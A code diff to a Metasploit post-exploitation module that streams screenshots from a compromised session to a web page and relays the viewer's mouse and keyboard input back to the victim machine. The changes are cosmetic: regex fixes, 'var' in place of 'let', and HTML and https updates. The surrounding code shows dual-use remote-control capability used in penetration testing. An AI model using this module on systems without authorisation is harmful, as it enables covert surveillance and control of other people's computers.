@@ -39,11 +39,11 @@ class MetasploitModule < Msf::Post
   end
 
   def on_request_uri(cli, request)
-    if request.uri =~ %r{/screenshot$*}
+    if request.uri =~ %r{/screenshot$}
       quality = 50
       data = session.ui.screenshot(quality)
       send_response(cli, data, {'Content-Type'=>'image/jpeg', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0'})
-    elsif request.uri =~ %r{/event$*}
+    elsif request.uri =~ %r{/event$}
       query = CGI.parse(request.body)
       seq = query['i'].first.to_i
       if seq <= @last_sequence + 1
@@ -73,13 +73,13 @@ class MetasploitModule < Msf::Post
 </head>
 <body onload="updateImage()">
 <noscript>
-<h2><font color="red">Error: You need Javascript enabled to watch the stream.</font></h2>
+<h2 style="color:#f00">Error: You need JavaScript enabled to watch the stream.</h2>
 </noscript>
 <img onload="updateImage()" onerror="noImage()" id="streamer">
 <br><br>
-<a href="http://www.metasploit.com" target="_blank">www.metasploit.com</a>
+<a href="https://www.metasploit.com" target="_blank">www.metasploit.com</a>
 </body>
-<script language="javascript">
+<script type="text/javascript">
 var i = 1;
 var img = document.getElementById("streamer");
 
@@ -93,7 +93,7 @@ function updateImage() {
 }
 
 function mouseEvent(action, x, y) {
-  let req = new XMLHttpRequest;
+  var req = new XMLHttpRequest;
   req.open("POST", "#{uripath}event", true);
   req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
   req.send('action='+action+'&x='+x+'&y='+y+'&i='+i);
@@ -101,7 +101,7 @@ function mouseEvent(action, x, y) {
 }
 
 function keyEvent(action, key) {
-  let req = new XMLHttpRequest;
+  var req = new XMLHttpRequest;
   req.open("POST", "#{uripath}event", true);
   req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
   req.send('action=key&keyaction='+action+'&key='+key+'&i='+i);
@@ -109,13 +109,13 @@ function keyEvent(action, key) {
 }
 
 document.onkeydown = function(event) {
-  let key = event.which || event.keyCode;
+  var key = event.which || event.keyCode;
   keyEvent(1, key);
   event.preventDefault();
 }
 
 document.onkeyup = function(event) {
-  let key = event.which || event.keyCode;
+  var key = event.which || event.keyCode;
   keyEvent(2, key);
   event.preventDefault();
 }
@@ -126,7 +126,7 @@ img.onmousemove = function(event) {
   event.preventDefault();
 }
 img.onmousedown = function(event) {
-  let action = 'leftdown';
+  var action = 'leftdown';
   if (event.which == 3) {
     action = 'rightdown';
   }
@@ -134,7 +134,7 @@ img.onmousedown = function(event) {
   event.preventDefault();
 }
 img.onmouseup = function(event) {
-  let action = 'leftup';
+  var action = 'leftup';
   if (event.which == 3) {
     action = 'rightup';
   }
